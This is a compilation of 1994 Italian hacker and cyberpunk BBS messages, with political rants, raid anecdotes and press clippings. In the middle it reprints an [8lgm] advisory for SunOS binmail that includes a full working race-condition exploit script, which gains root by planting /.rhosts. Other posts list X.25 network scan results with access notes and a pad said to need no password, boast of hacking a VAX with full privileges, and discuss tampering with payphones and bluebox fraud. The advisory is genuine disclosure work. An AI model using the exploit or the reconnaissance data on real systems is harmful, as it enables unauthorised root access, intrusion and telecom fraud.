	 Key fingerprint =  5B 8C 55 64 98 4E AF 64  61 E4 8A 12 2F F7 9B A1 

-!- ifmail v.2.4
 ! Origin: Cyber Rights Now! (65:1400/5@cybernet)
SEEN-BY: 1/1 5/1 9/1 10/2 1000/1 4 1100/1 1200/1 2 5 6 7 1400/1 2 3 4
SEEN-BY: 1400/5 1500/3 1600/1 1800/1 1900/1 2000/1

---------------------------------------

Msgr. Arkimede
Area Lo Sfogatoio          
Mitt JOE
Data 20/06/94 20:46:22
Msg_651  1/1  Object: Quando dico certe cose         

vorrei crepare di botto.                
Non cio' ce ho detto.                   
Altro. Ancora prima.

---------------------------------------

BBS DECODER

 Area: Dibattito CyberPunx 
  Msg#: 5769                                         Date: 30 Jul 94  08:28
  From: H.P.F.S.                                     Read: Yes    Replied: No 
    To: Fox Lodari                                   Mark:                     
  Subj: Point.Linux

[Fox]

IO SONO DIVENTATO KOSI:

	-=@|-#>

ti sembra possibile ridursi kosi`??? A me no !!! Perkui mi devi dare,
prima che mi venga un esaurimento da FACCINE la configurazione del Point per
LinuX, oppure la versione del BT che hai tu modificata per LinuxXX

(acc.. sto diventando proprio nevrastenico, ho smesso di scrive con la K)

		Pleeeeeeaaaaaaaaassssssseee!!!!


-!- Acropolis Mailer 0.92
 ! Origin: LiWixARD.dot.four (65:1100/5.4)
SEEN-BY: 1/1 4/1 5/1 9/1 10/2 999/999 1000/1 4 1100/1 2 5 6 7 1200/1 2
SEEN-BY: 1200/5 6 1400/1 1500/1 1600/1 1800/1 1900/1 2000/1


  Msg#: 5784                                         Date: 01 Aug 94  19:32
  From: The creeper                                  Read: Yes    Replied: No 
    To: Spirito libero (e ficcante)                  Mark:                     
  Subj: Bad smell

A parte la puzza delle tue ascelle marce
    si sente anche un vago odore di vorrei ma non posso.
	Anzi. Il ficcante contenuto delle tue proposizioni balorde
	    ha gettato nello sconforto persino il mio cactus
	che, gia' sofferente di aerofagia, sta scoppiettando nel vaso,
    e, nel delirio dell'estate indiana, cerca un culo in cui
trovare riparo. Forse ti puo' interessare.

  Msg#: 5895                                         Date: 12 Mar 94  17:23
  From: Enzo Catania                                 Read: Yes    Replied: No 
    To: Virtualcip                                   Mark:                     
  Subj: Un uomo, una vergogna!

In un messaggio di 31 Jul 94
Virtualcip dicevi a Marco Venturini Autieri:

 V> ... Emilio Fede ci ha rotto i coglioni!!!!

Liguori e' riuscito a fracassare anche le briciole! :-)
 ____ _
  /  ( )  69th Point of ECN
 /arro/__ Azzz!


  Msg#: 5946                                         Date: 05 Aug 94  21:09
  From: The creeper                                  Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: Holy..days

il  g0vern0
      va in vaccanza  www

      no-
      in va-c-anza
	man-c-anza

	e noi in
	suddit-anza    ci riempiremo la p-anza   delle stronzate
						       concime per poveri
						       illusi
						       elettori (sic)

ma, si sa, i maroni estivi non sono meno gonfi di quelli invernali
ALLARME ALLARME!  Demagogia(  Bugia!

---------------------------------------

----------------------------------------------------------------------------

		    Introduction to [8lgm] Advisory Releases

----------------------------------------------------------------------------



In the light of the current move towards openness in the discussion of  compu-
ter security related matters, the [8lgm] team have decided to release some  of 
their back catalogue of [8lgm] advisories previously unavailable to outsiders.


Those advisories deemed suitable for publication are known to the relevant or-
ganisations  concerned (e.g. CERT).  However, these vulnerabilities  have  not 
been  given the publicity required so that system administrators  can  correct 
the  problem.   In most cases, fixes are currently available;  please  contact 
your vendor directly for patch details.

[8lgm] was created in early 1989 by several individuals with a common interest 
in computer security.  Up until 1991, [8lgm] members actively used  vulnerabi-
lities  to obtain access to many computer systems world-wide.  After this  pe-
riod, any results of research have been reported and passed onto vendors.  Ho-
wever,  this work has been carried out on a limited number of   platforms,  so 
the  true extent of any vulnerability is currently unknown.

If the problem described in any advisory is discovered to affect operating sy-
stems not mentioned, please e-mail [8lgm] at 8lgm@bagpuss.demon.co.uk,  giving 
full details so that this information can be added to the bug database.

Please do not hesitate to contact [8lgm] with any questions related to  compu-
ter security.  An [8lgm] team member will deal with your enquiry in the stric-
test of confidence, and provide assistance whenever required.

8lgm-bugs@bagpuss.demon.co.uk              (To report security flaws)
8lgm-request@bagpuss.demon.co.uk      (Request for [8lgm] Advisories)
8lgm@bagpuss.demon.co.uk         (General enquiries)

This introductory file and the advisories mentioned have been forwarded to the 
following newsgroups and mailing lists.

 comp.security.unix
      INFOHAX                 <infohax-emergency@stormking.com>
       BUGTRAQ                 <chasin@crimelab.com>
   CERT/CC                 <cert@cert.org>

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.3a

mQCNAi138foAAAEEANMr/+dGdcMgmK6p61OjhUVUEnqRBvlX6PZa/1wM1hziNJgV
q/VIkLqYpMUIGRYWs2NS/WgF6N1BldXib2EbZ3MNjR5fYeMnwu2amTfGkkcl9IYQ
t3xj0/g69tPYJvlmcLdDx787b6UlIKT9xF+5Z5pCZp0QEyU/CtKRWea3gAuFAAUR
tCFbOGxnbV0gPDhsZ21AYmFncHVzcy5kZW1vbi5jby51az4=
=ivMN
-----END PGP PUBLIC KEY BLOCK-----

---------------------------------------

From 8lgm@bagpuss.demon.co.uk Fri May  6 22:49:11 EDT 1994

This advisory has been sent to:

	comp.security.unix
	BUGTRAQ                 <bugtraq@crimelab.com>
	CERT/CC                 <cert@cert.org>
	Sun Microsystems        <security-alert@sun.com>

===========================================================================
		[8lgm]-Advisory-6.UNIX.mail2.2-May-1994


PROGRAM:

	binmail(1)        (/usr/bin/mail)

VULNERABLE OS's:

	SunOS 4.1.x with Sun's latest binmail patch - 100224-07.

DESCRIPTION:

 Sun released a patch 100224-07 to fix the problems described
    in [8lgm]-Advisory-5.UNIX.mail.24-Jan-1992.  After 5 weeks,
     Sun have produced a fix which will defeat our original script,
  but the original problem remains, and is now even worse then
    the original!

	The old race condition still exists in the patched binmail(1),
     which allows files to be created in arbitrary places on the
     filesystem.  These files can be owned by arbitrary (usually
     system) users.

  A new problem allows 0 length files to be created anywhere in
   the filesystem, even without a race.

IMPACT:

	Any user with access to binmail(1) can become root.

REPEAT BY:

	This example demonstrates how to become root on most affected
	machines by creating root's .rhosts file.  Please do not do
	this unless you have permission.

	Note that this script will only create new files, not append
    to existing ones (as did the one in the previous advisory).
     A variation on this script could easily be written to append
    to existing files.  On the other hand, you are now virtually
    guaranteed to win this race, which is what makes this problem
   worse than the original.

	Create the following file, 'mailscript2':

8<--------------------------- cut here ----------------------------
#!/bin/sh
#
# Syntax: mailscript2 user target-file rsh-user
#
# This exploits a flaw in SunOS binmail(1), and attempts
# to become the specified 'user', by creating a .rhosts
# file and using rsh.
#
# Written 1994 by [8LGM]
# Please do not use this script without permission.
#
PATH=/usr/ucb:/usr/bin:/bin      export PATH
IFS=" "                          export IFS

PROG="`basename $0`"
SPOOLDIR="/var/spool/mail"

# Check args
if [ $# -ne 3 ]; then
	echo "Syntax: $PROG user target-file rsh-user"
	exit 1
fi
TARGET="$1"
TARGET_FILE="$2"
RSH_USER="$3"

# Check we're on SunOS
if [ "x`uname -s`" != "xSunOS" ]; then
	echo "Sorry, this only works on SunOS"
	exit 1
fi

# Check user exists
grep "^$TARGET:" /etc/passwd >/dev/null 2>&1
if [ $? -ne 0 ]; then
	echo "$PROG: Warning, $TARGET not in local passwd file"
	# We continue though, might be in the YP passwd file
fi

# Check target file
if [ -f $TARGET_FILE ]; then
	OLD_TARGET_LEN=`ls -ld $TARGET_FILE | awk -F' ' '{print $4}'` 2>/dev/null
	echo "$PROG: Warning, $TARGET_FILE already exists, cant race with this script"
    exit 1
else
	OLD_TARGET_LEN=0
fi

# Delete spool file if its a link, and we are able
if [ -h "$SPOOLDIR/$TARGET" ]; then
	rm -f "$SPOOLDIR/$TARGET"
	# Dont worry about errors, we catch it below
fi

# Check mail file
if [ -f "$SPOOLDIR/$TARGET" ]; then
	echo "$PROG: ${TARGET}'s mail file exists."
	exit 1
fi

# Make the race program
cat >mailrace.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

main(argc,argv)
int argc;
char *argv[];
{
	if (argc != 3) {
		fprintf(stderr, "Usage: %s mailfile newfile\n", argv[0]);
		exit(1);
	}

     symlink(argv[2], argv[1]);
      while(access(argv[2], F_OK));
   unlink(argv[1]);
	close(creat(argv[1], 0600));
}
EOF
cc -o mailrace mailrace.c

# Check we now have mailrace
if [ ! -x "mailrace" ]; then
	echo "$PROG: couldnt compile mailrace.c - check it out"
	exit 1
fi

# Start mailrace
RACE_PID=$!

# Send mail to the user
NEW_TARGET_LEN=$OLD_TARGET_LEN
while [ "x$NEW_TARGET_LEN" = "x$OLD_TARGET_LEN" ]; do
	echo "Sending mail to $TARGET"
	echo "localhost $USER" | /bin/mail $TARGET
	sleep 10
	kill -STOP $RACE_PID
	rm -f $SPOOLDIR/$TARGET >/dev/null 2>&1
	if [ -f $SPOOLDIR/$TARGET ]; then
		echo "$PROG: Sorry, we lost the race - cant try again."
		kill -9 $RACE_PID
		exit 1
	fi
	kill -CONT $RACE_PID
   if [ -f "$TARGET_FILE" ]; then
	  NEW_TARGET_LEN=`ls -ld $TARGET_FILE | awk -F' ' '{print $4}'` 2>/dev/null
       else
	    NEW_TARGET_LEN=0
	fi
	if [ "x$NEW_TARGET_LEN" = "x$OLD_TARGET_LEN" ]; then
		echo "We drew the race that time, trying again"
	fi
done

# We won the race
kill -9 $RACE_PID
echo "We won the race, becoming $RSH_USER"
rsh localhost -l $RSH_USER sh -i
exit 0
8<--------------------------- cut here ----------------------------

	(Lines marked with > represent user input)

Check what root users are on the system:

>       % grep :0: /etc/passwd
	root:*:0:1:Operator:/:/bin/csh
	sysdiag:*:0:1:Old System Diagnostic:/usr/diag/sysdiag:/usr/diag/sysdiag/sysdiag
	sundiag:*:0:1:System Diagnostic:/usr/diag/sundiag:/usr/diag/sundiag/sundiag
	+::0:0:::

We choose a user with UID 0, but without a /var/spool/mail/<username> file:

>       % ls -l /var/spool/mail/sysdiag
	/var/spool/mail/sysdiag not found

Execute mailscript2.  The user is sysdiag, the target file is /.rhosts, and
the user to rsh to on success is root:

>       % chmod 700 mailscript2
>       % ./mailscript2 sysdiag /.rhosts root
       Sending mail to sysdiag
 kill: process 6268: No such process
     kill: process 6268: No such process
     kill: process 6268: No such process
     We won the race, becoming root
	#


DISCUSSION:

	This problem exists because /var/spool/mail is rwxrwxrwt.  For
	a full discussion, see [8lgm]-Advisory-5.UNIX.mail.24-Jan-1992.

 The original code, checked the user's mailbox with an lstat(2)
  before opening it.  This checks that the mailbox is not a link.

 Sun's 100224-07 patch does this check after opening the file.
   This simply defeat's the script given in the above advisory,
    it is NOT a fix for the problem.

	We believe that the only correct way to fix this problem
	is to make the mail spool directory o-w.  Other methods discussed
       on c.s.u are not totally secure.

	Denial of service attacks are possible, due to /var/spool/mail
  being world writeable.  For example, creating a link to a users
 mailbox would prevent that user from receiving any further mail.
	binmail would return mail to sender with the following message:

[...]

   ----- Transcript of session follows -----
mail: /var/spool/mail/user has more than one link or is a symbolic link
mail: /var/spool/mail/user: cannot append
Mail saved in dead.letter
554 user... Service unavailable

[...]

   This problem can only be prevented by adopting a mode 775
       or mode 755 mail spool directory.



WORKAROUND & FIX:

	1. Contact your vendor for a workable patch.

	2. The workaround in [8lgm]-Advisory-5.UNIX.mail.24-Jan-1992
	 remains valid and is still required.


FEEDBACK AND CONTACT INFORMATION:

	8lgm-bugs@bagpuss.demon.co.uk           (To report security flaws)

	8lgm-request@bagpuss.demon.co.uk        (Request for [8lgm] Advisories)

	8lgm@bagpuss.demon.co.uk                (General enquiries)

	System Administrators are encouraged to contact us for any
	other information they may require about the problems described
	in this advisory.

	We welcome reports about which platforms this flaw does or does
	not exist on.


	NB: 8lgm-bugs@bagpuss.demon.co.uk is intended to be used by
	people wishing to report which platforms/OS's the bugs in our
	advisories are present on.  Please do *not* send information on
	other bugs to this address - report them to your vendor and/or
	comp.security.unix instead.
===========================================================================

--
-----------------------------------------------------------------------
8lgm-bugs@bagpuss.demon.co.uk           (To report security flaws)
8lgm-request@bagpuss.demon.co.uk        (Request for [8lgm] Advisories)
8lgm@bagpuss.demon.co.uk                (General enquiries)


---------------------------------------

 Area: Dibattito CyberPunx 
  Msg#: 6345                                         Date: 07 Aug 94  20:43
  From: Captain Swing                                Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: Sequestro di un cd-noleggio

>una piccola sturiellet estiva...

un mio amico che noleggia(va) cd e' stato colpito da mandato di sequestro
relativamente al noleggio, e fin qui storia risentita mille volte... lui e'
iscritto all'associazione noleggiatori che aveva gia' impugnato la questione a
milano e roma, ecc.. ecc..

ma la gdf non si sarebbe mai aspettata di trovare nel bugigattolo del mio ami-
co  anche computer e disketti!! MARONN!!! di corsa dal pm a riferire  ed  ecco 
che  il giorno dopo il mandato diventa relativo anche alla detenzione  abusiva 
di materiale copyright, software sospetto, macchine atte alla duplicazione di
programmi bla bla bla....
si sono ripresentati con tanto di manualetto della BSA che spiega cosa si puo'
fare (niente) e cosa non si puo' fare (tutto), insieme al famigerato disketti-
no trova-(C)...

stavolta la gdf e' andata via molto + contenta, carica dei 3 pc del tizio, un
2000 disks e speranzosa di trovare kissa' cosa negli hd.
ma ahime' il tizio aveva pwdato tutto, e il pur bravo (!) tecnico non riusciva
proprio a crackarle...

no problem: la proposta e' stata :"se ci dai le pw chiudiamo un occhio, senno'
ne apriamo 3!"... ovvia la risposta del tizio, gia' incasinato con storie di
noleggio CD e videogames...

ma oltre al danno la beffa: dopo un mesetto che negli uffici della gdf si
lavorava alacremente alla perquisizione di suddetto materiale, il tizio li  va 
a trovare per esternare la sua dose settimanale di bestemmie e trova appesi ai
muri dell'ufficio le stampe decorative (cornici, scritte simpatiche,  disegni-
ni)  che lui realizzava su ordinazione per farsi un po' di pubblicita',  smaz-
zandosi  come 1 pazzo... "e quelle? " gli fa lui... "ah, niente... le  abbiamo 
trovate in un giornale..." rispondono...

TE CAPI'?!?!?!? E QUESTA NON E' FRODE? NON E' SFRUTTAMENTO ABUSIVO DELLE
CREAZIONI ARTISTICHE DI UN AUTORE? A LUI I DIRITTI NON SPETTANO? rob de mat..

per farla breve, ora il tizio non puo' lavorare, mentre i figli dei finanzieri 
magari stanno distribuendo le suddette stampe agli amici dicendogli "guarda!
tutta la notte ci ho messo, ma guarda che figata!!!"

		...sob...

  Msg#: 6565                                         Date: 18 Aug 94  02:33
  From: Xxxxxxxx xxxxx                               Read: Yes    Replied: No 
    To: Captain Swing                                Mark:                     
  Subj: Re: Sequestro di un cd-noleggio

In article <2e454ab4@p4.f1.n1100.z65.gateway.nervous.com>
Captain.Swing@p4.f1.n1100.z65.gateway.nervous.com (Captain Swing) writes:

>dicendogli "guarda! tutta la notte ci ho messo, ma guarda che figata!!!"

Non e' niente... durante la perquisizione nella mia abitazione in seguito
alla triste storia che noi tutti sappiamo (Fido Bust) i bravi finanzieri
hanno pensato bene di intascarsi due Swatch Crono da collezione...
ho detto INTASCARE non SEQUESTRARE!! I figli di questi bravi finanzieri
si' che saranno contenti, io un po' meno. 

Xxxxxxxx

  Msg#: 6654            Sent Local                   Date: 21 Aug 94  12:43
  From: Luke Lone                                    Read: Yes    Replied: No 
    To: Igor Tosolini                                Mark:                     
  Subj: Re: Phrakka la cabina

Vagando nel cyberspazio, Igor Tosolini scrisse a Luke Lone:

 IT> ricerchiamo quello che ci e' negato dalla $ip ... mi pare giusto e
 IT> doveroso !

Piu` che altro, io seguo questa politica: se il prezzo e` accessibile,
pago, se non lo e`, rubo. E` un comportamento che manda in bestia gli
economisti, perche` scombussola tutte le loro delicate teorie su domanda
e offerta, ma e` molto vantaggioso. ;-)

 IT> qua siamo in tanti qualcuno esperto ha fatto delle prove ?
 IT> altrimenti dovro' farle io O;-)

Buona fortuna! Guarda che non e` mica facile: e` gia` un problema
togliere le viti arrugginite (se ci sono) che fissano l'intelaiatura
dei telefoni. Forse con piede di porco e fiamma ossidrica.... >-]]]

Servirebbe anche attrezzarsi opportunamente: c'e` nessuno che ha qualche
idea su un PC portatile compattissimo ed ancor piu` economico? La CPU
non importa, basta anche uno schifido 8086, l'importante e` che abbia un
HD da 10-20 mega e una UART 16550 a cui abbinare un pocket modem.


 IT> Dai , tra Fido e da qua riuscrai a racimolare informzioni a sufficenza

Ecco un primo cross-report:

============================= CUT HERE =========================

 Area: Telefonia e comunicazioni 
  Msg#: 290             Rec'd                        Date: 16 Aug 94  17:07:34
  From: Stefano Zano                                 Read: Yes    Replied: Yes
    To: Luca Losito                                  Mark:
  Subj: Monitoraggio cabine

 Ciao, Luca!  Ho letto il messaggio da te inviato a All
 il 14 Aug 94 e quoto:

 LL> Mi chiedevo da un po' di tempo se le cabine telefoniche siano in qualche
 LL> modo "monitorate".

 Si. Essendo apparecchiature accessibili a tutti (brave persone e vandali)
 hanno un monitoraggio molto spinto. Ogni minima variazione dallo stato
 funzionale standard viene rilevato.
 L'apparecchio che si vede per la strada non e' altro che un terminale
 stupido stupido. Alle spalle di questo terminale, in luoghi non accessibili,
 c'e' una unita' di controllo molto sofisticata che e' in continuo
 monitoraggio.
 molto sof

 LL> Se, per puro caso O:-), i fili che arrivano ad una cabina andassero in
 LL> cortocircuito o qualcuno li tagliasse, scatterebbe l'allarme nucleare in
 LL> centrale o nessuno si accorgerebbe di niente fino alla segnalazione
 LL> "manuale" del guasto?

 L'apparecchiatura a monte si accorge della variazione e invia in c.le
 un allarme "Urgente Telefonia Pubblica". Questo allarme viene trasferito
 al centro di competenza, poi li ci pensa l'essere umano a decidere cosa
 fare. Il che e' tutto dire :-))

 LL> Le cabine sono anche abilitate alle chiamate internazionali, ma
 LL> ovviamente il contascatti parte a mitraglia: se la cosa succedesse un
 LL> po' troppo spesso alla stessa cabina, potrebbero insospettirsi?

 Si. Come ti dicevo prima ogni variazione anomala viene segnalata.
 In questo caso il sistema a monte mette fuori servizio autonomamente
 l'apparecchio per errore sugli incassi.

 LL> Esiste un qualche controllo di corrispondenza tra il numero di scatti
 LL> registrati per ogni cabina e le operazioni effettuate dai rispettivi
 LL> lettori di schede magnetiche?

 Questo non te lo so dire con esattezza, ma propenderei per il si.

 Ovviamente questa e' solo la teoria o meglio, come funziona sulla carta.
 La realta' e' tutta da scoprire. :-)


 Ciao.  Stefano                             -wmw-

-!- Comma_22/2+
 ! Origin: E le stelle stanno a guardare (2:332/416.4205)

======================== END CUT ==============================

Stefano Zano e` un dipendente di una societa` concessionaria della $ip,
che si occupa dell'installazione di centrali telefoniche: le sue
informazioni sono attendibilissime.

Ulteriori approfondimenti nei prossimi giorni.

Long live the hacking,                              _
					|          |_
					|__ |_| |< |_

-!- Blue Wave/RA v2.12 [NR]
 ! Origin: !!DECODER BBS-- <<Power2ThePeople>> 14:00-08:00 * 2-29527597
(65:1200/1)


  Msg#: 5597                                         Date: 24 Jul 94  17:46
  From: Virtualcip                                   Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: Caos e reti

Hello All!

Quest'area sta diventando sempre piu' la dimostrazione tangibile di come un
sistema chaotico autorganizzato sia superiore , in quanto a complessita', alla
somma delle sue parti....

Guardate cosa succede quando un utente immette un messaggio....cio' che sembra
essere chaos (e lo e') si organizza prendendo il messaggio , plasmandolo , e
costruendo qualcosa di nuovo.....qualcosa che prima non c'era!

Questa mi sembra una cosa stupenda , forse ho letto troppi libri , ma credo che
non siamo molto lontani dalla "rete totale" o "rete mondiale"....

Potrebbe essere internet....chissa',sicuramente dovra' essere libera come non
mai,senza controlli da parte di governi , multinazionali e media
"normali"......

Solo cosi' infatti si puo' giungere al formarsi di una realta' nuova....

Chiamiamola "societa' telematica" , "gaia" , "rete intelligente" o come volete
voi....l'importante e', come dicevo prima , che l'intelligenza totale sara'
superiore alla somma delle singole entita' che ne fanno parte (gli utenti)....

Si formera' un "superorganismo",una mente formata da milioni di
menti......pensate alle implicazioni!
Sono cosi' tante che mi viene il mal di testa solo a pensare di farne una
piccola descrizione , quindi non la faro' .....lascio ognuno libero di
immaginarsele , poi semmai ne possiamo discutere.

Saranno sicuramente giorni di luce nel buio della storia umana.
E non siamo neanche tanto lontano da questi giorni.......

Voi che ne pensate ?

Hello....
Virtualcip

  Msg#: 5916                                         Date: 04 Aug 94  11:20
  From: Zeus Kissakie'                               Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: Busts... che palle...

Dalla Stampa di oggi Mercoledi' 03/08/94 Pag 11

Milano, smascherati tre pirati informatici.

MILANO. Attraverso una serie di intercittazioni telematiche, del tutto simili a
quelle telefonich, ma effettuate su linee di interconnessioni tra computer, la
Digos di Milano ha scoperto tre giovani "pirati informatici". Sono tre ragazzi
di Milano, uno di Roma e uno di Siracusa, in eta' compresa tra i 17 e i 25
anni, ciascuno dei quali ha agito per proprio conto. Utilizzavano i piu'
disparati servizi informatici grazie ai codici segreti di una azienda alla
quale venivano poi automaticamente addebitati i costi delle "piraterie".

Voci sentite in giro...

I coinvolti di Milano non sarebbero una ma due persone.
Tutti e tre (quattro) sono stati scoperti poiche' utilizzavano 
la NUI di Milano BIBXXX, nota alla scena hacking ormai da mesi
e usata da un vastissimo gruppo di persone.
I tipi erano abbastanza noti su messaggerie di tipo videotel,
quali Arkie ed altre.
Secondo altri giornali sono stati denunciati per truffa anche per
l'utilizzo un programma di blueboxing (i bene informati parlano
di bluebeep). Pare anche che la compagnia telefonica non abbia chiuso 
quella via di boxing (probabilmente il paese piu' usato) per "bustare"
altre persone... quest'ultima affermazione prendetela con le molle
ma state ugualmente molto attenti. Pare che se siete su centrale
elettromeccanica corriate molti meno rischi.
La scena oggi si interroga, riflette sui rischi potenziali e reali,
e solo nei prossimi giorni sapremo qualcosa di piu'.
Un'ultima cosa: l'inchiesta pare sia partita due mesi fa, quindi
dopo quella dell'Italian Crackdown. A voi le riflessioni...

cya
Z@K

---------------------------------------

Msgr Arkimede - Un msg di  Drake  

bha ... prova 167823132 , sembra proprio un pad 
itapac dai messaggi che da, si entra pure senza nessuna password

---------------------------------------

Pazzia in Fidonet !!!
 Area: [Echo] Ms-Dos Hardware 
  Msg#: 3465                                         Date: XX Aug 94  15:06
  From: Xaxxxx Xxxxxxx                               Read: Yes    Replied: No 
    To: Xxxxx Xxxxxxx                                Mark:                     
  Subj: Super 486DX33

NK4QKxx-0310071300114   <<<<<<<---------- *:D (modificata dalla Redazione !!)
^^^^^^^^^^^^^^^^^^^^^
Ciao!

cosa fa il tuo processore dopo i fatidici 30 minuti di overclock? e' una cosa
che mi preme molto perche' vorrei sapere se in caso di problemi me ne posso
accorgere o meno (con relative lugubri conseguenze...)

-!-
 ! Origin: Xxxxxxx Xxxxxxxxxx - XX-XX-XXXXXXX (2:XXX/XXX)

---------------------------------------

Mitt Xxxx Xxxxxxx
Data 07/01/94 21:49:15
Msg_XXX  1/2  Object:Scanning NUA
Finlandia  (telecom)              02442050xx
				      02 pw
				      03 pw
				      05 mute
				      08 x25(pw)
				      09 OCC
				      11 OCC (busy)
				      12 mute
				      16 com ..poi butta fuori
				      23 Telebox E-mail
				      24 mute
				      25 vax
				      33 mute
				      39  Hewlett Packard
				      46  teletel ???
				      52  MHP201A
				      54  TELEBOX E-Mail
				      55     "      "     
				      69  mute
				      73
				      74  mute anche 73 
				      75  Hewlett Packard
				      78  mute
				      82  open session  HELLO
				      85  telebox E-Mail
				      86  Telebox E-Mail
				      99  mute
      bye

---------------------------------------

Mitt Xxxxxxxxxxx
Data 09/03/94 21:38:20
Msg_XXXX 1/2  Object: Risultato & Report dello Scan. 

Lo scan Sprint ha dato i seguenti risultati:
1) beccato dec server con pad che chiama quasi tutte le nazioni, purtroppo
   e' lento...
2) Beccati svariati vax ed hackerato uno con full privs (e presto, udite 
   udite, una bella BBS con CHAT!)
Segue una lista delle aree scannate...  
201 (fino a 411..cioe' 20100411)        
203 fino a 588                          
207 fino a 21 (sembra morta)            
212 fino a 1116                         
219 fino a 123                          
								     
---------------------------------------

BBS DECODER

 Area: News dai Centri Sociali 
  Msg#: 5172                                         Date: 14 Jul 94  02:15
  From: mastro ciliegia                              Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: L'orrorismo a Bologna

LA REPUBBLICA - BOLOGNA DI GIOVEDI' 14 LUGLIO 1994 DEDICA UN'INTERA PAGINA (!)
ALLE PROVOCAZIONI "ORRORISTE"!

Titoli a pag.I:

Budella di animali "per rompere la routine", e ora il gioco gli e' sfuggito di
mano
ATTENTI AGLI ORRORISTI
Coprono auto e bus di frattaglie. "Ma e' arte"

Un gruppo di studenti nascosti da pseudonimi si sono conosciuti attraverso il
computer, vogliono imitare i situazionisti francesi

Curoi di maiale, interiora d'animali diversi che lasciano di stucco la gente
sui mezzi pubblici, per strada, ai giardini

E c'e' chi ha deciso di seguire le loro orme. "Magari e' qualcuno che vuole
madarci dei messaggi e mettersi in contatto con noi"

di Benedetta Cucci, servizio a pag. V


e andiamo a pag.V:

CHE HORROR, L'ARTE DELLE INTERIORA
Cuori di maiale su auto e bus e ora spuntano gli imitatori

UN MACABRO giochino di societa', un divertimento splatter travestito da provo-
cazione  intellettuale e' di scena a Bologna. Potremmo chiamarla  "frattaglia-
mania". Cuori, cervella, interiora d'animali diversi che lasciano di stucco la 
gente sugli autobus,  per strada, ai giardini. Passanti distratti che  vengono 
colti  di sorpresa da oggettini disgustosi come teste di  tacchino  putrefatte 
sul  marciapiede. Signore che si avvicinano a bambini per scoprire che  stanno 
giocando  a biglie con teste di gatto. Situazioni e racconti che turbano  per-
che', oltre a impressionare, trasformano la routine quotidiana in una sorta di 
iperrealta' horror.

TESTE DI GATTO E CUORI DI MAIALE

Il primo episodio della serie risale al 27 maggio. Durante una manifestazione
di teatro di strada in via Indipendenza un ragazzo inizia a contorcersi, cade
per terra e, improvvisamente, si apre la camicia facendone uscire viscere ani-
mali. Poi, due giorn i fa, un altro fatto ugualmente trucido: il  ritrovamento 
di un cuore, probabilmente di maiale, legato a un albero ai giardini Margheri-
ta con un biglietto. Poi tutta una serie di racconti terrificanti che  piovono 
in redazione attraverso lettere. Adriano Longhini, ad esempio, racconta di  a-
ver trovato il 13 giugno sull'autobus, linea 14, "un barattolo nascosto  sotto 
il sedile. Ne e' uscito un liquido giallastro il cui odore nauseabondo ha fat-
to storcere il naso a tutti i passeggeri". O chi, come Erich Pasetti, ha  tro-
vato sul cofano della sua Rover "svariati chili di cervella animali".

Verita',  esagerazioni,  comuqnue c'e' una sapiente regia  per  questa  estate 
splatter. Scavi un po' e scopri che il gioco e' condotto da un gruppo di  per-
sone che si sono conosciute via computer e modem. Li', nelle inconsistenti re-
ti  telematiche, hanno presa vita gli happening che hanno movimentato la  vita 
cittadina. Michele Serra, dalle pagine di Cuore, li definisce "orroristi" e  a 
loro, che non vogliono svelare la propria identita' individuale, il termine va 
benissimo, anche perce' non ne hanno cercato un altro per classificarsi.  L'u-
nica cosa certa di questo gruppo formato perlopiu' da studenti di  ingegneria, 
agraria o medicina ma anche da operai, e' che, dopo l'episodio pubblico di via 
Indipendenza  e  una lettera scritta da una falsa passante  sull'accaduto,  il 
gioco e' sfuggito di mano a chi l'ha iniziato. Le altre lettere, come l'episo-
dio dei giardini Margherita, non sono opera loro. "Il cuore trovato ai Giardi-
ni  e'  stata una sorpresa anche per noi - racconta James  Ellroy  (pseudonimo 
letterario), venticinquenne veneto, studente di lettere all'universita' di Bo-
logna e grande appassionato di teatro e romanzi polizieschi - magari si tratta 
di  qualcuno che vuole mandarci dei messaggi, vuole mettersi in  contatto  con 
noi, oppure e' solo uno sberleffo per i Cattolici popolari che stanno  facendo 
l'happening dei giovani. Chi lo sa! E comunque, tutte le altre lettere pubbli-
cate dai giornali, potrebbero essere false oppure verissime, come falso o vero 
puo'  essere l'accaduto. E' difficile capirlo. Noi non ci diciamo  mai  quello 
che facciamo, ma sappiamo benissimo quello che non facciamo.
Pare proprio che altri ci abbiano imitato".
Il progetto che sta alla base dell'intero gioco e' nato dopo una fitta conver-
sazione  sul cinema splatter in un'osteria bolognese; e sarebbe  semplicemente 
la voglia di "creare spaesamenti in citta', nei luoghi dove c'e' molta gente", 
parla ancora Ellroy,  "innescare istanti in cui la gente si pone delle  doman-
de,  si mette a riflettere su quel momento particolare della sua vita. Si  ac-
corge  di stare vivendo. Solitamente, quando una persona cammina  per  strada, 
non   e'  altro  che  un'unita'  di  circolazione.  Fa  le  vasche,  vive   di 
automatismi".

Gli affezionati della frattaglia non amano definirsi, ma certo richiamano alla 
mente le gesta dei "situazionisti" degli anni cinquanta e sessanta. 

"ALLARGARE LA VISIONE"

Somiglianza suggerita da Helena Velena, "hackeratrice culturale e sociale" co-
me lei si definisce, da sempre "situazionista", facendo riferimento a  attivi-
ta'  telematiche devianti e destabilizzatrici. "I situazionisti, nella  Parigi 
degli anni cinquanta, creavano eventi per vedere se era possibile creare imma-
ginario,  suscitare  reazioni. E lo facevano per allargare  la  visione  della 
realta'.  Facevano anche della psicogeografia, ovvero davano vita alle  situa-
zioni,  nei diversi distretti della citta' e studiavano gli sbalzi d'umore  da 
zona  a zona. E' quello che stanno facendo questi orroristi, o  forse  proprio 
neosituazionisti".

Ma il club misterioso a tutto cio' non replica. Sfugge alla gabbia delle defi-
nizioni, vuole restare solo un gruppo di persone, al di fuori di schemi  gene-
razionali,  con anche una grande passione per il teatro. E infatti  hanno  ap-
prezzato molto chi li ha paragonati al gruppo teatrale "Magazzini criminali" o 
Michele  Serra che parla di "frequentatori di scuole di animazione  teatrale". 
Tutto molto sofisticato, d'accordo. Ma se capitasse al prode Ellroy di trovar-
si sul cofano una scodellata di budella fumanti ? "Mi incazzerei. Ma ne  sarei 
anche contento. Sono fiero delle mie emozioni".---

 ! Origin: ECN Bologna 39-51-260556 (45:1917/4)
-!- 
